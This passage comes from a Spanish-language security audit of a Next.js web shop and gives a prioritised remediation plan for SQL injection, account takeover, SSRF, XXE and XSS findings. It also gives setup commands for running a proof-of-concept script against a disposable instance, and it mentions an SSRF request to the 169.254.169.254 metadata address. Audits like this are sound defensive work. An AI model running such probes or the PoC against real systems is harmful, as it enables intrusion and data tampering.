| Validación de entrada con Zod en la mayoría de rutas | `lib/validation/index.ts` — helper centralizado |
| `next.config.ts` restringe los hosts de `next/image` | `next.config.ts:5-16` |

---

## 8. Plan de remediación priorizado

### P0 — Contención inmediata (bloquea el despliegue)
1. **Rotar todos los secretos** y eliminar **todos** los valores por defecto: `JWT_SECRET` (`lib/server-auth.ts:12`), `SHARE_ENCRYPTION_KEY` (`lib/share-crypto.ts:8`), credenciales SIEM (`app/api/monitoring/auth/route.ts`), token diag, `streamKey`. Fallar en el arranque si falta cualquiera.
2. **Cerrar la vía de toma de control:** eliminar `role` del esquema de signup (F-01) y hacer el token de reseteo impredecible + almacenado hasheado + atómico (F-02).
3. **Autenticar `/api/files`** y corregir la contención de rutas (F-06).
4. **Eliminar los tres `$queryRawUnsafe`** por consultas parametrizadas de Prisma (F-03/04/05).
5. **Restringir el token de soporte** a la cuenta propia o a administración, y comprobar `revoked` (F-08).

### P1 — Antes del siguiente despliegue
6. Verificar la firma JWT en el middleware y usar comparación constante; migrar a `jose` (F-07).
7. Recalcular el total del pedido y el descuento del cupón **en el servidor**; hacer atómico el incremento de `usedCount` (F-11, F-18).
8. Añadir `userId: user.id` a los filtros de pedidos y wishlists (F-15).
9. Migrar las contraseñas a argon2id/bcrypt (F-10) y regenerar los códigos de regalo con `crypto.randomBytes` (F-19).
10. Eliminar la contraseña del log y quitar `password` de los campos exportables (F-21, F-23).
11. Sustituir `innerHTML`/`dangerouslySetInnerHTML` por renderizado de texto y añadir CSP (F-13).

### P2 — Endurecimiento
12. Implementar rate limiting global y por endpoint (F-22) y unificar los mensajes de error del login (F-26).
13. `lib/safe-fetch.ts` con allowlist para todo `fetch` saliente (F-12); desactivar entidades externas en libxml2 (F-14).
14. Mover la autorización del MCP al servidor y rotar su credencial a variable de entorno (F-17, F-24).
15. Usar `withAdminAuth` en `/api/live/stream` y excluir `streamKey`/`rtmpUrl` de las respuestas a no administradores (F-20).
16. Actualizar `next`/`react` a versiones parcheadas y alinear `eslint-config-next` (F-29).
17. Construir la URL de compartir desde `NEXT_PUBLIC_BASE_URL` en lugar de cabeceras (F-25).
18. Añadir tests de regresión de seguridad que ejecuten `security-audit/poc/verify.sh` en CI.

---

## 9. Artefactos generados

```
SECURITY_AUDIT.md                     Este informe
security-audit/
├── poc/verify.sh                     PoC reproducible (17 comprobaciones automatizadas)
└── evidence/poc-run.txt              Salida de la ejecución contra la instancia real
```

### Cómo reproducir

```bash
# 1. Preparar una instancia desechable
DATABASE_URL="file:/tmp/audit.db" npx prisma generate
DATABASE_URL="file:/tmp/audit.db" npx prisma db push --skip-generate
DATABASE_URL="file:/tmp/audit.db" npx tsx prisma/seed.ts
DATABASE_URL="file:/tmp/audit.db" npx next build --no-lint
DATABASE_URL="file:/tmp/audit.db" npx next start -p 3000

# 2. Ejecutar la PoC
cd security-audit/poc && DATABASE_URL=/tmp/audit.db BASE=http://localhost:3000 ./verify.sh
```

> ⚠️ **Advertencia:** la PoC **modifica datos** (crea usuarios, reescribe la contraseña del admin sembrado, crea pedidos). Úsese únicamente contra una instancia de pruebas desechable.
> La compilación requiere `--no-lint` porque el repositorio falla `next build` por errores de Prettier preexistentes en `lib/config.ts`, `lib/live-stream.ts`, `lib/types/index.ts` y varios componentes (no relacionados con la seguridad).

### Nota sobre el entorno de pruebas

El entorno de pruebas bloqueó la petición a `169.254.169.254` (rango reservado) en el nivel de red, no en la aplicación. **La aplicación no implementa ninguna defensa contra SSRF**; el hecho de que el sandbox lo bloquee es una medida de infraestructura, no un control del producto. Del mismo modo, el sandbox de pruebas no filtra las dependencias; la auditoría de dependencias se hizo por lectura de `package.json` y avisos de `npm`.
